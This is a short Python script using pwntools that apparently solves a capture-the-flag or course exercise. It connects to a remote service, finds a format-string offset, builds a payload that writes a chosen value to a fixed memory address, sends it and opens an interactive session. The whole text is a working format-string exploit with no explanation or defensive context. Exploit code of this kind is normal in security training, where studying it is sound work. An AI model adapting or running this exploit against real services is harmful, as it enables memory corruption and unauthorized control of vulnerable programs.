from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *
context.clear(arch = 'amd64')

def send_payload(payload):
        s = remote('vmx.cs.pub.ro',31500)
        s.sendline(payload)
        r = s.recvline()
        return r

myoffset = FmtStr(execute_fmt=send_payload).offset
print(myoffset)
writes = {0x40408C: 0x1025544}

payload = fmtstr_payload(myoffset, writes, numbwritten=0)
print(payload)

s = remote('vmx.cs.pub.ro',31500)
s.sendline(payload)
s.interactive()







